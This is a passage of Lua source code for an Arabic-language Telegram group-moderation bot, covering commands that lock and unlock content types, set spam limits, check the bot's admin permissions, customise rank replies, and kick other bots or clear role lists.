ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الهاشتاك")  
DevAIAN:set(WAAD..'AIAN:Lock:Hashtak'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الهاشتاك بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الجهات" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الجهات")  
DevAIAN:set(WAAD..'AIAN:Lock:Contact'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '️⌯︙الجهات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الشبكات" then
if not DevAIAN:get(WAAD..'AIAN:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الشبكات")  
DevAIAN:set(WAAD..'AIAN:Lock:WebLinks'..msg.chat_id_,true) 
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الشبكات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "العربيه" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل العربيه")  
DevAIAN:set(WAAD..'AIAN:Lock:Arabic'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العربيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الانكليزيه" then
if not DevAIAN:get(WAAD..'AIAN:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الانكليزيه")  
DevAIAN:set(WAAD..'AIAN:Lock:English'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الانكليزيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملصقات" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الملصقات")  
DevAIAN:set(WAAD..'AIAN:Lock:Stickers'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الملصقات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الماركداون" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الماركداون")  
DevAIAN:set(WAAD..'AIAN:Lock:Markdown'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الماركداون بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاشعارات" then
if not DevAIAN:get(WAAD..'AIAN:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الاشعارات")  
DevAIAN:set(WAAD..'AIAN:Lock:TagServr'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الاشعارات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "التوجيه" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل التوجيه")  
DevAIAN:set(WAAD..'AIAN:Lock:Forwards'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙التوجيه بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاباحي" then
if not DevAIAN:get(WAAD..'AIAN:AIAN:Lock:Xn'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفـل الاباحي")  
DevAIAN:set(WAAD..'AIAN:AIAN:Lock:Xn'..msg.chat_id_,"del")
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الاباحي بالفعل مقفل في المجموعه', 1, 'md')
end
end
end
end
end
--     Source WAAD     --
if BasicConstructor(msg) then
if text and text:match("^فتح (.*)$") then
local UnLockText = {string.match(text, "^(فتح) (.*)$")}
if UnLockText[2] == "الدردشه" then
if DevAIAN:get(WAAD..'AIAN:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الدردشه")  
DevAIAN:del(WAAD..'AIAN:Lock:Text'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الدردشه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصور" then
if DevAIAN:get(WAAD..'AIAN:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الصور")  
DevAIAN:del(WAAD..'AIAN:Lock:Photo'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if DevAIAN:get(WAAD..'AIAN:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الكلايش")  
DevAIAN:del(WAAD..'AIAN:Lock:Spam'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الكلايش بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الدخول" then
if DevAIAN:get(WAAD..'AIAN:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الدخول")  
DevAIAN:del(WAAD..'AIAN:Lock:Join'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الدخول بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفيديو" then
if DevAIAN:get(WAAD..'AIAN:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الفيديو")  
DevAIAN:del(WAAD..'AIAN:Lock:Videos'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الفيديو بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملفات" then
if DevAIAN:get(WAAD..'AIAN:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الملفات")  
DevAIAN:del(WAAD..'AIAN:Lock:Document'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الملفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاونلاين" then
if DevAIAN:get(WAAD..'AIAN:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الاونلاين")  
DevAIAN:del(WAAD..'AIAN:Lock:Inline'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الاونلاين بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الماركداون" then
if DevAIAN:get(WAAD..'AIAN:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الماركداون")  
DevAIAN:del(WAAD..'AIAN:Lock:Markdown'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الماركداون بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المتحركه" then
if DevAIAN:get(WAAD..'AIAN:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح المتحركه")  
DevAIAN:del(WAAD..'AIAN:Lock:Gifs'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙المتحركه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاغاني" then
if DevAIAN:get(WAAD..'AIAN:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الاغاني")  
DevAIAN:del(WAAD..'AIAN:Lock:Music'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الاغاني بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصوت" then
if DevAIAN:get(WAAD..'AIAN:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الصوت")  
DevAIAN:del(WAAD..'AIAN:Lock:Voice'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الصوت بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الروابط" then
if DevAIAN:get(WAAD..'AIAN:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الروابط")  
DevAIAN:del(WAAD..'AIAN:Lock:Links'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الروابط بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المواقع" then
if DevAIAN:get(WAAD..'AIAN:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح المواقع")  
DevAIAN:del(WAAD..'AIAN:Lock:Location'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙المواقع بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المعرف" or UnLockText[2] == "المعرفات" then
if DevAIAN:get(WAAD..'AIAN:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح المعرفات")  
DevAIAN:del(WAAD..'AIAN:Lock:Tags'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙المعرفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الهاشتاك" or UnLockText[2] == "التاك" then
if DevAIAN:get(WAAD..'AIAN:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الهاشتاك")  
DevAIAN:del(WAAD..'AIAN:Lock:Hashtak'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الهاشتاك بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الجهات" then
if DevAIAN:get(WAAD..'AIAN:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الجهات")  
DevAIAN:del(WAAD..'AIAN:Lock:Contact'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الجهات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الشبكات" then
if DevAIAN:get(WAAD..'AIAN:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الشبكات")  
DevAIAN:del(WAAD..'AIAN:Lock:WebLinks'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الشبكات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "العربيه" then
if DevAIAN:get(WAAD..'AIAN:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح العربيه")  
DevAIAN:del(WAAD..'AIAN:Lock:Arabic'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العربيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الانكليزيه" then
if DevAIAN:get(WAAD..'AIAN:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الانكليزيه")  
DevAIAN:del(WAAD..'AIAN:Lock:English'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الانكليزيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاشعارات" then
if DevAIAN:get(WAAD..'AIAN:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الاشعارات")  
DevAIAN:del(WAAD..'AIAN:Lock:TagServr'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الاشعارات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملصقات" then
if DevAIAN:get(WAAD..'AIAN:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الملصقات")  
DevAIAN:del(WAAD..'AIAN:Lock:Stickers'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الملصقات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "التوجيه" then
if DevAIAN:get(WAAD..'AIAN:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح التوجيه")  
DevAIAN:del(WAAD..'AIAN:Lock:Forwards'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙التوجيه بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاباحي" then
if DevAIAN:get(WAAD..'AIAN:AIAN:Lock:Xn'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الاباحي")  
DevAIAN:del(WAAD..'AIAN:AIAN:Lock:Xn'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الاباحي بالفعل مفتوح في المجموعه', 1, 'md')
end
end
end
--     Source WAAD     --
if text and text:match("^قفل التفليش$") or text and text:match("^تفعيل الحمايه القصوى$") then
if not Constructor(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمنشئين فقط', 1, 'md')
else
DevAIAN:set(WAAD.."AIAN:Lock:Bots"..msg.chat_id_,"del") DevAIAN:hset(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'AIAN:Lock:Links','AIAN:Lock:Contact','AIAN:Lock:Forwards','AIAN:Lock:Videos','AIAN:Lock:Gifs','AIAN:Lock:EditMsgs','AIAN:Lock:Stickers','AIAN:Lock:Farsi','AIAN:Lock:Spam','AIAN:Lock:WebLinks','AIAN:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevAIAN:set(WAAD..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل التفليش")  
end
end
if text and text:match("^فتح التفليش$") then
if not Constructor(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمنشئين فقط', 1, 'md')
else
DevAIAN:hdel(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'AIAN:Lock:Links','AIAN:Lock:Contact','AIAN:Lock:Forwards','AIAN:Lock:Videos','AIAN:Lock:Gifs','AIAN:Lock:EditMsgs','AIAN:Lock:Stickers','AIAN:Lock:Farsi','AIAN:Lock:Spam','AIAN:Lock:WebLinks','AIAN:Lock:Photo'}
for i,UnLock in pairs(UnLockList) do
DevAIAN:del(WAAD..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح التفليش")  
end
end
--     Source WAAD     --
if text and text:match("^قفل الكل$") then
if not BasicConstructor(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'للمنشئين الاساسين فقط', 1, 'md')
else
DevAIAN:del(WAAD..'AIAN:Lock:Fshar'..msg.chat_id_) DevAIAN:del(WAAD..'AIAN:Lock:Taf'..msg.chat_id_) DevAIAN:del(WAAD..'AIAN:Lock:Kfr'..msg.chat_id_) 
DevAIAN:set(WAAD.."AIAN:Lock:Bots"..msg.chat_id_,"del") DevAIAN:hset(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'AIAN:Lock:EditMsgs','AIAN:Lock:Farsi','AIAN:Lock:TagServr','AIAN:Lock:Inline','AIAN:Lock:Photo','AIAN:Lock:Spam','AIAN:Lock:Videos','AIAN:Lock:Gifs','AIAN:Lock:Music','AIAN:Lock:Voice','AIAN:Lock:Links','AIAN:Lock:Location','AIAN:Lock:Tags','AIAN:Lock:Stickers','AIAN:Lock:Markdown','AIAN:Lock:Forwards','AIAN:Lock:Document','AIAN:Lock:Contact','AIAN:Lock:Hashtak','AIAN:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
DevAIAN:set(WAAD..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل جميع الاوامر")  
end
end
if text and text:match("^فتح الكل$") then
if not BasicConstructor(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, 'للمنشئين الاساسين فقط', 1, 'md')
else
DevAIAN:set(WAAD..'AIAN:Lock:Fshar'..msg.chat_id_,true) DevAIAN:set(WAAD..'AIAN:Lock:Taf'..msg.chat_id_,true) DevAIAN:set(WAAD..'AIAN:Lock:Kfr'..msg.chat_id_,true) DevAIAN:hdel(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'AIAN:Lock:EditMsgs','AIAN:Lock:Text','AIAN:Lock:Arabic','AIAN:Lock:English','AIAN:Lock:Join','AIAN:Lock:Bots','AIAN:Lock:Farsi','AIAN:Lock:FarsiBan','AIAN:Lock:TagServr','AIAN:Lock:Inline','AIAN:Lock:Photo','AIAN:Lock:Spam','AIAN:Lock:Videos','AIAN:Lock:Gifs','AIAN:Lock:Music','AIAN:Lock:Voice','AIAN:Lock:Links','AIAN:Lock:Location','AIAN:Lock:Tags','AIAN:Lock:Stickers','AIAN:Lock:Markdown','AIAN:Lock:Forwards','AIAN:Lock:Document','AIAN:Lock:Contact','AIAN:Lock:Hashtak','AIAN:Lock:WebLinks'}
for i,UnLock in pairs(UnLockList) do
DevAIAN:del(WAAD..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح جميع الاوامر")  
end
end
--     Source WAAD     --
if BasicConstructor(msg) then
if text and (text:match("^ضع سبام (%d+)$") or text:match("^وضع سبام (%d+)$")) then
local SetSpam = text:match("ضع سبام (%d+)$") or text:match("وضع سبام (%d+)$")
if tonumber(SetSpam) < 40 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙اختر عدد اكبر من 40 حرف ', 1, 'md')
else
DevAIAN:set(WAAD..'AIAN:Spam:Text'..msg.chat_id_,SetSpam)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم وضع عدد السبام ↫'..SetSpam, 1, 'md')
end
end
end
--     Source WAAD     --
if Manager(msg) then
if text == "فحص" or text == "فحص البوت" then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..WAAD)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙صلاحيات البوت هي ↫ ⤈\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙حذف الرسائل ↫ '..DEL..'\n⌯︙دعوة المستخدمين ↫ '..INV..'\n⌯︙حظر المستخدمين ↫ '..BAN..'\n⌯︙تثبيت الرسائل ↫ '..PIN..'\n⌯︙تغيير المعلومات ↫ '..EDT..'\n⌯︙اضافة مشرفين ↫ '..VIP..'\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ', 1, 'md')
end end
if text and text:match("^تغير رد المطور (.*)$") then
local Text = text:match("^تغير رد المطور (.*)$") 
DevAIAN:set(WAAD.."AIAN:SudoBot:Rd"..msg.chat_id_,Text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم تغير رد المطور الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") then
local Text = text:match("^تغير رد منشئ الاساسي (.*)$") 
DevAIAN:set(WAAD.."AIAN:BasicConstructor:Rd"..msg.chat_id_,Text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم تغير رد المنشئ الاساسي الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنشئ (.*)$") then
local Text = text:match("^تغير رد المنشئ (.*)$") 
DevAIAN:set(WAAD.."AIAN:Constructor:Rd"..msg.chat_id_,Text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم تغير رد المنشئ الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المدير (.*)$") then
local Text = text:match("^تغير رد المدير (.*)$") 
DevAIAN:set(WAAD.."AIAN:Managers:Rd"..msg.chat_id_,Text) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم تغير رد المدير الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد الادمن (.*)$") then
local Text = text:match("^تغير رد الادمن (.*)$") 
DevAIAN:set(WAAD.."AIAN:Admins:Rd"..msg.chat_id_,Text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم تغير رد الادمن الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المميز (.*)$") then
local Text = text:match("^تغير رد المميز (.*)$") 
DevAIAN:set(WAAD.."AIAN:VipMem:Rd"..msg.chat_id_,Text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم تغير رد المميز الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنظف (.*)$") then
local Text = text:match("^تغير رد المنظف (.*)$") 
DevAIAN:set(WAAD.."AIAN:Cleaner:Rd"..msg.chat_id_,Text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم تغير رد المنظف الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد العضو (.*)$") then
local Text = text:match("^تغير رد العضو (.*)$") 
DevAIAN:set(WAAD.."AIAN:mem:Rd"..msg.chat_id_,Text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم تغير رد العضو الى ↫ "..Text, 1, 'md')
end
if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حذف جميع ردود الرتب", 1, 'md')
DevAIAN:del(WAAD.."AIAN:mem:Rd"..msg.chat_id_)
DevAIAN:del(WAAD.."AIAN:Cleaner:Rd"..msg.chat_id_)
DevAIAN:del(WAAD.."AIAN:VipMem:Rd"..msg.chat_id_)
DevAIAN:del(WAAD.."AIAN:Admins:Rd"..msg.chat_id_)
DevAIAN:del(WAAD.."AIAN:Managers:Rd"..msg.chat_id_)
DevAIAN:del(WAAD.."AIAN:Constructor:Rd"..msg.chat_id_)
DevAIAN:del(WAAD.."AIAN:BasicConstructor:Rd"..msg.chat_id_)
DevAIAN:del(WAAD.."AIAN:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source WAAD     --
if text == "كشف البوتات" and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = '⌯︙*قائمة البوتات* ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n'
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
ab = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
ab = ' ✯'
end
text = text.."~ [@"..data.username_..']'..ab.."\n"
if #admins == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتوجد بوتات هنا*", 1, 'md')
return false end
if #admins == i then 
local a = 'ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙*عدد البوتات هنا* ↫ '..n..'\n'
local f = '⌯︙*عدد البوتات المرفوعه* ↫ '..t..'\n⌯︙*ملاحضه علامة الـ*✯ *تعني ان البوت ادمن في هذه المجموعه*'
Dev_AIAN(msg.chat_id_, msg.id_, 1, text..a..f, 1, 'md')
end
end,nil)
end
end,nil)
end
if text == 'حذف البوتات' and ChCheck(msg) or text == 'طرد البوتات' and ChCheck(msg) or text == 'مسح البوتات' and ChCheck(msg) then
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp)  
local admins = dp.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if dp.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(WAAD) then
ChatKick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتوجد بوتات هنا*", 1, 'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*عدد البوتات هنا* ↫ "..c.."\n⌯︙*عدد البوتات المرفوعه* ↫ "..x.."\n⌯︙*تم طرد* ↫ "..(c - x).." *من البوتات*", 1, 'md')
end 
end,nil)  
end 
--     Source WAAD     --
end
--     Source WAAD     --
if Admin(msg) then
if text and text:match("^حذف (.*)$") or text and text:match("^مسح (.*)$") then
local txts = {string.match(text, "^(حذف) (.*)$")}
local txtss = {string.match(text, "^(مسح) (.*)$")}
if Sudo(msg) then 
if txts[2] == 'الثانويين' or txtss[2] == 'الثانويين' or txts[2] == 'المطورين الثانويين' or txtss[2] == 'المطورين الثانويين' then
DevAIAN:del(WAAD..'AIAN:SecondSudo:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف المطورين الثانويين")  
end
end
if SecondSudo(msg) then 
if txts[2] == 'المطورين' or txtss[2] == 'المطورين' then
DevAIAN:del(WAAD..'AIAN:SudoBot:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف المطورين")  
end
if txts[2] == 'قائمه العام' or txtss[2] == 'قائمه العام' then
DevAIAN:del(WAAD..'AIAN:BanAll:')
DevAIAN:del(WAAD..'AIAN:MuteAll:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف قائمة العام")  
end
end
if SudoBot(msg) then
if txts[2] == 'الادمنيه العامين' or txts[2] == 'الادمنيه العام' or txtss[2] == 'الادمنيه العامين' or txtss[2] == 'الادمنيه العام' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف الادمنيه العامين")  
DevAIAN:del(WAAD..'AIAN:AdminAll:')
end
if txts[2] == 'المميزين عام' or txts[2] == 'المميزين العامين' or txtss[2] == 'المميزين عام' or txtss[2] == 'المميزين العامين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف المميزين عام")  
DevAIAN:del(WAAD..'AIAN:VipAll:')
end
if txts[2] == 'المدراء العامين' or txts[2] == 'المدراء العام' or txtss[2] == 'المدراء العامين' or txtss[2] == 'المدراء العام' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف المدراء العامين")  
DevAIAN:del(WAAD..'AIAN:ManagerAll:')
end
if txts[2] == 'المالكين' or txtss[2] == 'المالكين' then
DevAIAN:del(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,dp) 
local admins = dp.members_
for i=0 , #admins do
if dp.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevAIAN:sadd(WAAD.."AIAN:AIANConstructor:"..msg.chat_id_,admins[i].user_id_)
end 
end  
end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف المالكين\n✓")  
end
end
if AIANConstructor(msg) then
if txts[2] == 'المنشئين الاساسيين' or txtss[2] == 'المنشئين الاساسيين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف المنشئين الاساسيين\n✓")  
DevAIAN:del(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_)
end
end
if BasicConstructor(msg) then
if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
